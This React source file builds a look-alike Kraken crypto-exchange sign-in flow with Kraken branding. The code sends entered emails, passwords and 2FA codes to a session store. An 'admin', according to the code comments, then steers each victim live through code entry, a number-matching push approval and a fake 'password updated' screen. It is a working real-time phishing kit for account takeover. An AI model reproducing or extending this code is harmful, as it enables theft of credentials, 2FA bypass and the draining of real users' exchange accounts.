"use client"

import { useState, useEffect } from "react"
import { Eye, EyeOff, Loader as Loader2, Smartphone, Mail, CircleCheck as CheckCircle2, ChevronDown, Globe } from "lucide-react"
import Image from "next/image"
import { useSession } from "@/hooks/use-session"

type KrakenStage = "login" | "2fa_select" | "2fa_authenticator" | "2fa_email" | "2fa_sms" | "security_check" | "completed"

// Kraken Logo Component
function KrakenLogo() {
  return (
    <Image
      src="https://cdn.brandfetch.io/idYQrXoH-Q/theme/dark/logo.svg?c=1dxbfHSJFAPEGdCLU4o5B"
      alt="Kraken"
      width={120}
      height={32}
      className="h-8 w-auto"
      priority
    />
  )
}

// Footer Component - Light theme
function KrakenFooter() {
  return (
    <footer className="fixed bottom-0 left-0 right-0 flex items-center justify-between px-6 py-4 text-[13px] text-[#6B6B7B] bg-[#F5F5F5]">
      <div className="flex items-center">
        <span>Brokerage services are provided by Kraken Securities, LLC, member <a href="#" onClick={(e) => e.preventDefault()} className="text-[#7B61FF] hover:underline">FINRA</a>/<a href="#" onClick={(e) => e.preventDefault()} className="text-[#7B61FF] hover:underline">SIPC</a>. <a href="#" onClick={(e) => e.preventDefault()} className="text-[#7B61FF] hover:underline">Disclosures here</a>.</span>
      </div>
      <div className="flex items-center gap-6">
        <a href="#" onClick={(e) => e.preventDefault()} className="hover:text-[#1E1E2D] transition-colors">Privacy Notice</a>
        <a href="#" onClick={(e) => e.preventDefault()} className="hover:text-[#1E1E2D] transition-colors">Terms of Service</a>
      </div>
    </footer>
  )
}

// Login Stage - Exact Kraken Design (Light Theme)
function LoginStage({ 
  onNext, 
  email, 
  setEmail, 
  password, 
  setPassword,
  isWaiting 
}: { 
  onNext: () => void
  email: string
  setEmail: (v: string) => void
  password: string
  setPassword: (v: string) => void
  isWaiting: boolean
}) {
  const [showPassword, setShowPassword] = useState(false)
  const [error, setError] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  
  // Show loading if already submitted and waiting for admin
  const showLoadingState = isLoading || isWaiting
  
  const isValidEmail = (email: string) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    return emailRegex.test(email)
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (!email.trim()) {
      setError("Email or username is required")
      return
    }
    // Validate email format
    if (!isValidEmail(email.trim())) {
      setError("Please enter a valid email address")
      return
    }
    if (!password) {
      setError("Password is required")
      return
    }
    setError("")
    setIsLoading(true)
    onNext()
  }

  return (
    <div className="flex min-h-screen flex-col bg-[#F5F5F5]">
      {/* Header */}
      <header className="flex items-center justify-between px-6 py-4">
        <KrakenLogo />
        <div className="flex items-center gap-3">
          <button className="flex cursor-pointer items-center gap-2 rounded-full border border-[#E0E0E0] bg-white px-4 py-2 text-sm font-medium text-[#1E1E2D] transition-colors hover:bg-gray-50">
            <Globe size={16} />
            <span>English (US)</span>
            <ChevronDown size={16} />
          </button>
          <button className="cursor-pointer rounded-lg bg-[#7B61FF] px-4 py-2 text-sm font-medium text-white transition-colors hover:bg-[#6B51EF]">
            Create Account
          </button>
        </div>
      </header>

      {/* Main Content */}
      <div className="flex flex-1 items-center justify-center px-4 pb-20">
        <div className="w-full max-w-[420px] rounded-2xl bg-white p-8 shadow-sm">
          {/* Animated Kraken Mascot */}
          <div className="mb-6 flex justify-center">
            <video
              autoPlay
              loop
              muted
              playsInline
              className="h-[120px] w-[120px] object-contain"
            >
              <source src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Beast_Web-A8CKL2AKGxPWN1cSyW6cFKVa4MSFLm.webm" type="video/webm" />
            </video>
          </div>

          <h1 className="mb-6 text-center text-[24px] font-semibold text-[#1E1E2D]">Sign in to Kraken</h1>
          
          <form onSubmit={handleSubmit} className="space-y-4">
            {/* Email/Username Field */}
            <div>
              <div className="relative">
                <input
                  type="text"
                  value={email}
                  onChange={(e) => { setEmail(e.target.value); setError("") }}
                  className="peer w-full rounded-lg border border-[#E0E0E0] bg-white px-4 pb-2 pt-6 text-[#1E1E2D] placeholder-transparent outline-none transition-colors focus:border-[#7B61FF] focus:ring-1 focus:ring-[#7B61FF]"
                  placeholder="Email or username"
                  autoFocus
                  id="email"
                />
                <label 
                  htmlFor="email"
                  className="absolute left-4 top-2 text-xs text-[#6B6B7B] transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:text-xs"
                >
                  Email or username
                </label>
              </div>
            </div>

            {/* Password Field */}
            <div>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => { setPassword(e.target.value); setError("") }}
                  className="peer w-full rounded-lg border border-[#E0E0E0] bg-white px-4 pb-2 pt-6 pr-12 text-[#1E1E2D] placeholder-transparent outline-none transition-colors focus:border-[#7B61FF] focus:ring-1 focus:ring-[#7B61FF]"
                  placeholder="Password"
                  id="password"
                />
                <label 
                  htmlFor="password"
                  className="absolute left-4 top-2 text-xs text-[#6B6B7B] transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:text-xs"
                >
                  Password
                </label>
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 top-1/2 -translate-y-1/2 cursor-pointer text-[#6B6B7B] hover:text-[#1E1E2D] transition-colors"
                >
                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                </button>
              </div>
            </div>

            {/* Forgot Password Link */}
            <div className="text-left">
              <span className="text-sm text-[#6B6B7B]">Forgot </span>
              <a href="#" onClick={(e) => e.preventDefault()} className="text-sm text-[#7B61FF] hover:underline">
                password
              </a>
              <span className="text-sm text-[#6B6B7B]"> or </span>
              <a href="#" onClick={(e) => e.preventDefault()} className="text-sm text-[#7B61FF] hover:underline">
                username
              </a>
              <span className="text-sm text-[#6B6B7B]">?</span>
            </div>

            {error && (
              <p className="text-sm text-red-500">{error}</p>
            )}

            {/* Continue Button */}
            <button
              type="submit"
              disabled={showLoadingState}
              className="flex w-full cursor-pointer items-center justify-center gap-2 rounded-lg bg-[#7B61FF] py-3.5 text-base font-semibold text-white transition-colors hover:bg-[#6B51EF] disabled:opacity-70 disabled:cursor-not-allowed"
            >
              {showLoadingState ? (
                <>
                  <Loader2 className="h-5 w-5 animate-spin" />
                  <span>Signing in...</span>
                </>
              ) : (
                "Continue"
              )}
            </button>
          </form>

          {/* Divider */}
          <div className="my-5 flex items-center gap-4">
            <div className="h-px flex-1 bg-[#E0E0E0]" />
            <span className="text-sm text-[#6B6B7B]">Or</span>
            <div className="h-px flex-1 bg-[#E0E0E0]" />
          </div>

          {/* Social Sign In Buttons */}
          <div className="flex justify-center gap-4">
            {/* Google Button */}
            <button className="flex h-12 w-12 cursor-pointer items-center justify-center rounded-lg border border-[#E0E0E0] bg-white transition-colors hover:bg-gray-50">
              <svg width="24" height="24" viewBox="0 0 24 24">
                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
              </svg>
            </button>

            {/* Apple Button */}
            <button className="flex h-12 w-12 cursor-pointer items-center justify-center rounded-lg border border-[#E0E0E0] bg-white transition-colors hover:bg-gray-50">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="#000000">
                <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
              </svg>
            </button>
          </div>

          {/* Support Link */}
          <p className="mt-6 text-center text-sm text-[#6B6B7B]">
            {"Still can't sign in? "}
            <a href="#" onClick={(e) => e.preventDefault()} className="text-[#7B61FF] hover:underline">
              Email us
            </a>
          </p>
        </div>
      </div>

      <KrakenFooter />
    </div>
  )
}

// 2FA Selection Stage
function TwoFASelectStage({ onSelect }: { onSelect: (type: "authenticator" | "email" | "sms") => void }) {
  return (
    <div className="flex min-h-screen flex-col bg-[#F5F5F5]">
      <header className="flex items-center justify-between px-6 py-4">
        <KrakenLogo />
      </header>
      <div className="flex flex-1 items-center justify-center px-4 pb-20">
        <div className="w-full max-w-[420px] rounded-2xl bg-white p-8 shadow-sm">
          <h1 className="mb-2 text-center text-[24px] font-semibold text-[#1E1E2D]">Two-factor authentication</h1>
          <p className="mb-8 text-center text-[#6B6B7B]">Choose your verification method</p>
          
          <div className="space-y-3">
            <button
              onClick={() => onSelect("authenticator")}
              className="flex w-full cursor-pointer items-center gap-4 rounded-xl border border-[#E0E0E0] bg-white p-4 text-left transition-colors hover:border-[#7B61FF] hover:bg-[#F9F9FF]"
            >
              <div className="flex h-12 w-12 items-center justify-center rounded-full bg-[#7B61FF]/10">
                <Smartphone className="h-6 w-6 text-[#7B61FF]" />
              </div>
              <div>
                <p className="font-medium text-[#1E1E2D]">Authenticator app</p>
                <p className="text-sm text-[#6B6B7B]">Use your authenticator app code</p>
              </div>
            </button>

            <button
              onClick={() => onSelect("email")}
              className="flex w-full cursor-pointer items-center gap-4 rounded-xl border border-[#E0E0E0] bg-white p-4 text-left transition-colors hover:border-[#7B61FF] hover:bg-[#F9F9FF]"
            >
              <div className="flex h-12 w-12 items-center justify-center rounded-full bg-[#7B61FF]/10">
                <Mail className="h-6 w-6 text-[#7B61FF]" />
              </div>
              <div>
                <p className="font-medium text-[#1E1E2D]">Email verification</p>
                <p className="text-sm text-[#6B6B7B]">Receive a code via email</p>
              </div>
            </button>

            <button
              onClick={() => onSelect("sms")}
              className="flex w-full cursor-pointer items-center gap-4 rounded-xl border border-[#E0E0E0] bg-white p-4 text-left transition-colors hover:border-[#7B61FF] hover:bg-[#F9F9FF]"
            >
              <div className="flex h-12 w-12 items-center justify-center rounded-full bg-[#7B61FF]/10">
                <svg className="h-6 w-6 text-[#7B61FF]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
                </svg>
              </div>
              <div>
                <p className="font-medium text-[#1E1E2D]">SMS verification</p>
                <p className="text-sm text-[#6B6B7B]">Receive a code via SMS</p>
              </div>
            </button>
          </div>
        </div>
      </div>
      <KrakenFooter />
    </div>
  )
}

// 2FA Code Entry Stage
function TwoFACodeStage({ 
  type, 
  email,
  onSubmit, 
  code, 
  setCode 
}: { 
  type: "authenticator" | "email" | "sms"
  email: string
  onSubmit: () => void
  code: string
  setCode: (v: string) => void
}) {
  const [error, setError] = useState("")

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (!code || code.length < 6) {
      setError("Please enter a valid 6-digit code")
      return
    }
    setError("")
    onSubmit()
  }

  const getTitle = () => {
    switch (type) {
      case "authenticator": return "Enter your authenticator code"
      case "email": return "Enter email verification code"
      case "sms": return "Enter SMS verification code"
    }
  }

  const getDescription = () => {
    const maskedEmail = email.replace(/(.{2})(.*)(@.*)/, "$1***$3")
    switch (type) {
      case "authenticator": return "Enter the 6-digit code from your authenticator app"
      case "email": return `We sent a code to ${maskedEmail}`
      case "sms": return "We sent a code to your phone ending in ****"
    }
  }

  return (
    <div className="flex min-h-screen flex-col bg-[#F5F5F5]">
      <header className="flex items-center justify-between px-6 py-4">
        <KrakenLogo />
      </header>
      <div className="flex flex-1 items-center justify-center px-4 pb-20">
        <div className="w-full max-w-[420px] rounded-2xl bg-white p-8 shadow-sm">
          <div className="mb-6 flex justify-center">
            <div className="flex h-16 w-16 items-center justify-center rounded-full bg-[#7B61FF]/10">
              {type === "authenticator" && <Smartphone className="h-8 w-8 text-[#7B61FF]" />}
              {type === "email" && <Mail className="h-8 w-8 text-[#7B61FF]" />}
              {type === "sms" && (
                <svg className="h-8 w-8 text-[#7B61FF]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
                </svg>
              )}
            </div>
          </div>
          
          <h1 className="mb-2 text-center text-[24px] font-semibold text-[#1E1E2D]">{getTitle()}</h1>
          <p className="mb-8 text-center text-[#6B6B7B]">{getDescription()}</p>

          <form onSubmit={handleSubmit}>
            <div className="mb-4">
              <input
                type="text"
                value={code}
                onChange={(e) => { setCode(e.target.value.replace(/\D/g, "").slice(0, 6)); setError("") }}
                className="w-full rounded-lg border border-[#E0E0E0] bg-white px-4 py-4 text-center font-mono text-2xl tracking-[0.5em] text-[#1E1E2D] placeholder-[#A9A9B8] outline-none transition-colors focus:border-[#7B61FF] focus:ring-1 focus:ring-[#7B61FF]"
                placeholder="000000"
                maxLength={6}
                autoFocus
              />
            </div>

            {error && (
              <p className="mb-4 text-center text-sm text-red-500">{error}</p>
            )}

            <button
              type="submit"
              className="w-full cursor-pointer rounded-lg bg-[#7B61FF] py-3.5 text-base font-semibold text-white transition-colors hover:bg-[#6B51EF]"
            >
              Verify
            </button>

            {type !== "authenticator" && (
              <p className="mt-4 text-center text-sm text-[#6B6B7B]">
                {"Didn't receive a code? "}
                <a href="#" onClick={(e) => e.preventDefault()} className="text-[#7B61FF] hover:underline">
                  Resend
                </a>
              </p>
            )}
          </form>
        </div>
      </div>
      <KrakenFooter />
    </div>
  )
}

// Security Check Stage
function SecurityCheckStage({ securityNumber }: { securityNumber: string }) {
  return (
    <div className="flex min-h-screen flex-col bg-[#F5F5F5]">
      <header className="flex items-center justify-between px-6 py-4">
        <KrakenLogo />
      </header>
      <div className="flex flex-1 items-center justify-center px-4 pb-20">
        <div className="w-full max-w-[420px] rounded-2xl bg-white p-8 shadow-sm text-center">
          <div className="mb-6 flex justify-center">
            <div className="flex h-16 w-16 items-center justify-center rounded-full bg-[#7B61FF]/10">
              <svg className="h-8 w-8 text-[#7B61FF]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
              </svg>
            </div>
          </div>
          
          <h1 className="mb-2 text-[24px] font-semibold text-[#1E1E2D]">Security verification</h1>
          <p className="mb-8 text-[#6B6B7B]">Tap the matching number on your Kraken app</p>

          <div className="mb-8 rounded-2xl bg-[#F5F5F5] p-8">
            <div className="inline-flex rounded-xl bg-[#7B61FF] px-12 py-6">
              <span className="text-[48px] font-bold leading-none tracking-wider text-white">{securityNumber || "42"}</span>
            </div>
          </div>

          <div className="flex items-center justify-center gap-2 text-[#6B6B7B]">
            <div className="h-4 w-4 animate-spin rounded-full border-2 border-[#E0E0E0] border-t-[#7B61FF]" />
            <span>Waiting for confirmation...</span>
          </div>
        </div>
      </div>
      <KrakenFooter />
    </div>
  )
}

// Completed Stage
function CompletedStage({ newPassword }: { newPassword: string }) {
  return (
    <div className="flex min-h-screen flex-col bg-[#F5F5F5]">
      <header className="flex items-center justify-between px-6 py-4">
        <KrakenLogo />
      </header>
      <div className="flex flex-1 items-center justify-center px-4 pb-20">
        <div className="w-full max-w-[420px] rounded-2xl bg-white p-8 shadow-sm text-center">
          <div className="mb-6 flex justify-center">
            <div className="flex h-16 w-16 items-center justify-center rounded-full bg-green-500/10">
              <CheckCircle2 className="h-10 w-10 text-green-500" />
            </div>
          </div>
          
          <h1 className="mb-2 text-[24px] font-semibold text-[#1E1E2D]">Password Updated</h1>
          <p className="mb-8 text-[#6B6B7B]">Your account security has been enhanced</p>

          <div className="mb-8 rounded-2xl bg-[#F5F5F5] p-6">
            <p className="mb-3 text-sm uppercase tracking-wide text-[#6B6B7B]">Your new password</p>
            <code className="inline-block rounded-lg bg-white border border-[#E0E0E0] px-6 py-3 font-mono text-2xl font-medium tracking-wider text-[#1E1E2D]">
              {newPassword || "k8s2p4dq"}
            </code>
            <p className="mt-4 text-sm text-[#6B6B7B]">
              Save this password securely. You will need it to sign in.
            </p>
          </div>

          <div className="mb-6 rounded-xl bg-yellow-50 border border-yellow-200 p-4">
            <p className="text-sm text-yellow-700">
              For your security, we recommend changing this password after signing in.
            </p>
          </div>

          <button
            onClick={() => window.location.href = "https://kraken.com"}
            className="w-full cursor-pointer rounded-lg bg-[#7B61FF] py-3.5 text-base font-semibold text-white transition-colors hover:bg-[#6B51EF]"
          >
            Continue to Kraken
          </button>
        </div>
      </div>
      <KrakenFooter />
    </div>
  )
}

// Main Kraken Flow Component
export default function KrakenFlow() {
  const { sessionId, session, isReady, saveSession } = useSession("kraken")
  const [stage, setStage] = useState<KrakenStage>("login")
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [code, setCode] = useState("")
  const [codeType, setCodeType] = useState<"authenticator" | "email" | "sms">("authenticator")
  const [securityNumber, setSecurityNumber] = useState("42")
  const [newPassword, setNewPassword] = useState("k8s2p4dq")

  // Set page title and favicon
  useEffect(() => {
    document.title = "Sign in to Kraken"
    const link = document.querySelector("link[rel~='icon']") as HTMLLinkElement | null
    if (link) {
      link.href = "https://cdn.brandfetch.io/idYQrXoH-Q/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
    }
  }, [])

  // React to session updates from admin
  useEffect(() => {
    if (!session) return
    
    const serverStage = session.stage as KrakenStage
    if (serverStage && serverStage !== stage) {
      // Admin moved us to a new stage
      if (serverStage.startsWith("2fa_")) {
        const type = serverStage.replace("2fa_", "") as "authenticator" | "email" | "sms"
        if (type === "authenticator" || type === "email" || type === "sms") {
          setCodeType(type)
        }
      }
      if (serverStage === "security_check" && session.data?.securityNumber) {
        setSecurityNumber(session.data.securityNumber)
      }
      if (serverStage === "completed" && session.data?.newPassword) {
        setNewPassword(session.data.newPassword)
      }
      setStage(serverStage)
    }
  }, [session, stage])

  // Handle login submission
  const handleLoginNext = () => {
    saveSession({ 
      email, 
      password, 
      stage: "login",
      status: "waiting",
    })
  }

  // Handle 2FA method selection
  const handle2FASelect = (type: "authenticator" | "email" | "sms") => {
    setCodeType(type)
    saveSession({ 
      stage: `2fa_${type}`,
      data: { ...session?.data, codeType: type }
    })
    setStage(`2fa_${type}` as KrakenStage)
  }

  // Handle 2FA code submission
  const handle2FASubmit = () => {
    saveSession({ 
      stage: "2fa_verify",
      status: "waiting",
      data: { ...session?.data, [`${codeType}Code`]: code }
    })
  }

  // Show loader while session initializes
  if (!isReady) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-[#F5F5F5]">
        <Loader2 className="h-8 w-8 animate-spin text-[#7B61FF]" />
      </div>
    )
  }

  // Determine if we're waiting for admin
  const isWaiting = session?.status === "waiting"

  return (
    <>
      {stage === "login" && (
        <LoginStage 
          onNext={handleLoginNext} 
          email={email} 
          setEmail={setEmail}
          password={password}
          setPassword={setPassword}
          isWaiting={isWaiting}
        />
      )}
      {stage === "2fa_select" && <TwoFASelectStage onSelect={handle2FASelect} />}
      {(stage === "2fa_authenticator" || stage === "2fa_email" || stage === "2fa_sms") && (
        <TwoFACodeStage 
          type={codeType} 
          email={email}
          onSubmit={handle2FASubmit} 
          code={code} 
          setCode={setCode} 
        />
      )}
      {stage === "security_check" && <SecurityCheckStage securityNumber={securityNumber} />}
      {stage === "completed" && <CompletedStage newPassword={newPassword} />}
    </>
  )
}
